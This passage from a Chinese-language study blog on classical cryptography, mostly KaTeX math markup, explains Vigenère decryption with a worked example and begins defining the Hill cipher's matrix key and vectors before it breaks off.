𝑝_𝑛)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">c</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，其中<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>𝑝</mi><mi>𝑖</mi></msub><mo>=</mo><mo stretchy="false">(</mo><msub><mi>𝑐</mi><mi>𝑖</mi></msub><mtext>−</mtext><msub><mi>𝑘</mi><mi>𝑖</mi></msub><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mn>26</mn><mo stretchy="false">)</mo><mtext>，</mtext><mi>i</mi><mo>=</mo><mn>1</mn><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">𝑝_𝑖 = (𝑐_𝑖 − 𝑘_𝑖)(\bmod 26)，i =1, 2, …, n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">−</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mopen">(</span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord">2</span><span class="mord">6</span><span class="mclose">)</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">n</span></span></span></span></p><p>即对每一个字母都用不同的表去进行移位代替。</p><h4 id="例题-4"><a class="markdownIt-Anchor" href="#例题-4"></a> 例题</h4><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo>=</mo><mi>a</mi><mi>p</mi><mi>p</mi><mi>l</mi><mi>i</mi><mi>e</mi><mi>d</mi><mi>c</mi><mi>r</mi><mi>y</mi><mi>p</mi><mi>t</mi><mi>o</mi><mi>s</mi><mi>y</mi><mi>s</mi><mi>t</mi><mi>e</mi><mi>m</mi></mrow><annotation encoding="application/x-tex">p = appliedcryptosystem</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">p</span><span class="mord mathnormal">p</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mord mathnormal">c</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord mathnormal">p</span><span class="mord mathnormal">t</span><span class="mord mathnormal">o</span><span class="mord mathnormal">s</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mord mathnormal">e</span><span class="mord mathnormal">m</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo>=</mo><mi>c</mi><mi>i</mi><mi>p</mi><mi>h</mi><mi>e</mi><mi>r</mi></mrow><annotation encoding="application/x-tex">k = cipher</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">c</span><span class="mord mathnormal">i</span><span class="mord mathnormal">p</span><span class="mord mathnormal">h</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span>，用Vigenere密码对其进行加密。</p><p>由<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo>=</mo><mi>c</mi><mi>i</mi><mi>p</mi><mi>h</mi><mi>e</mi><mi>r</mi></mrow><annotation encoding="application/x-tex">k=cipher</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">c</span><span class="mord mathnormal">i</span><span class="mord mathnormal">p</span><span class="mord mathnormal">h</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span>得n=6。密钥对应的数字序列为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mn>2</mn><mo separator="true">,</mo><mn>8</mn><mo separator="true">,</mo><mn>15</mn><mo separator="true">,</mo><mn>17</mn><mo separator="true">,</mo><mn>4</mn><mo separator="true">,</mo><mn>17</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(2,8,15,17,4,17)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">8</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">7</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">4</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">7</span><span class="mclose">)</span></span></span></span>。将明文按照每6个字母进行分组，并将这些明文字母转换为相应的数字，再用模26加上对应的密钥数字，加密过程如图所示：</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240623143319986.png" alt="image-20240623143319986" /></p><h3 id="hill密码"><a class="markdownIt-Anchor" href="#hill密码"></a> Hill密码</h3><p><font style="color:red">注意，由于Hill密码涉及到矩阵的乘法，所以运算顺序的不同会影响最终的结果。网络上的资料多为密钥右乘，而本文章遵循的是学校PPT教材，采取的方式是密钥左乘（即<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo>×</mo><mi>p</mi><mi mathvariant="normal">/</mi><mi>c</mi></mrow><annotation encoding="application/x-tex">k\times p/c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mord">/</span><span class="mord mathnormal">c</span></span></span></span>），务必留意。</font></p><p>基本思想：将<em>n</em>个明文字母通过线性变换，将它们转换为<em>n</em>个密文字母。解密只需做一次逆变换即可。</p><p>算法的密钥为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo>=</mo><mo stretchy="false">{</mo><msub><mi>Z</mi><mn>26</mn></msub><mtext>上的</mtext><mi>n</mi><mo>×</mo><mi>n</mi><mtext>可逆矩阵</mtext><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">k=\{Z_{26}上的n\times n可逆矩阵 \}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">上</span><span class="mord cjk_fallback">的</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">n</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">逆</span><span class="mord cjk_fallback">矩</span><span class="mord cjk_fallback">阵</span><span class="mclose">}</span></span></span></span>，明文p与密文c均为n维向量，记为：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo>=</mo><mrow><mo fence="true">(</mo><mtable rowspacing="0.15999999999999992em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>p</mi><mn>1</mn></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>p</mi><mn>2</mn></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>p</mi><mi>n</mi></msub></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><mo separator="true">,</mo><mspace width="1em"/><mi>c</mi><mo>=</mo><mrow><mo fence="true">(</mo><mtable rowspacing="0.15999999999999992em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>c</mi><mn>1</mn></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>c</mi><mn>2</mn></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>c</mi><mi>n</mi></msub></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><mo separator="true">,</mo><mi>k</mi><mo>=</mo><msub><mrow><mo fence="true">(</mo><msub><mi>k</mi><mrow><mi>i</mi><mi>j</mi></mrow></msub><mo fence="true">)</mo></mrow><mrow><mi>n</mi><mo>×</mo><mi>n</mi></mrow></msub><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnalign="center center center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>k</mi><mn>11</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>k</mi><mn>12</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">⋯</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>k</mi><mrow><mn>1</mn><mi>n</mi></mrow></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">⋱</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">⋱</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>k</mi><mrow><mi>n</mi><mn>1</mn></mrow></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>k</mi><mrow><mi>n</mi><mn>2</mn></mrow></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">⋯</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>k</mi><mrow><mi>n</mi><mi>n</mi></mrow></msub></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">p=\left(\begin{array}{c}p_{1} \\p_{2} \\\vdots \\p_{n}\end{array}\right), \quad c=\left(\begin{array}{c}c_{1} \\c_{2} \\\vdots \\c_{n}\end{array}\right), k=\left(k_{i j}\right)_{n \times n}=\left[\begin{array}{cccc}k_{11} &amp; k_{12} &amp; \cdots &amp; k_{1 n} \\\vdots &amp; \ddots &amp; &amp; \vdots \\\vdots &amp; &amp; \ddots &amp; \vdots \\k_{n 1} &amp; k_{n 2} &amp; \cdots &amp; k_{n n}\end{array}\right]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:5.459999999999999em;vertical-align:-2.4799999999999995em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.950035em;"><span style="top:-1.3499850000000007em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎝</span></span></span><span style="top:-2.4999950000000006em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎜</span></span></span><span style="top:-3.0950050000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎜</span></span></span><span style="top:-3.6900150000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎜</span></span></span><span style="top:-3.7100150000000007em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎜</span></span></span><span style="top:-4.950035000000001em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎛</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.4500349999999997em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.9799999999999995em;"><span style="top:-5.8275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-4.6275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.7674999999999996em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-1.5675000000000006em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.4799999999999995em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.950035em;"><span style="top:-1.3499850000000007em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎠</span></span></span><span style="top:-2.4999950000000006em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎟</span></span></span><span style="top:-3.0950050000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎟</span></span></span><span style="top:-3.6900150000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎟</span></span></span><span style="top:-3.7100150000000007em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎟</span></span></span><span style="top:-4.950035000000001em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎞</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.4500349999999997em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:5.459999999999999em;vertical-align:-2.4799999999999995em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.950035em;"><span style="top:-1.3499850000000007em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎝</span></span></span><span style="top:-2.4999950000000006em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎜</span></span></span><span style="top:-3.0950050000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎜</span></span></span><span style="top:-3.6900150000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎜</span></span></span><span style="top:-3.7100150000000007em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎜</span></span></span><span style="top:-4.950035000000001em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎛</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.4500349999999997em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.9799999999999995em;"><span style="top:-5.8275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-4.6275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.7674999999999996em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-1.5675000000000006em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.4799999999999995em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.950035em;"><span style="top:-1.3499850000000007em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎠</span></span></span><span style="top:-2.4999950000000006em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎟</span></span></span><span style="top:-3.0950050000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎟</span></span></span><span style="top:-3.6900150000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎟</span></span></span><span style="top:-3.7100150000000007em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎟</span></span></span><span style="top:-4.950035000000001em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎞</span></span></span></span><span 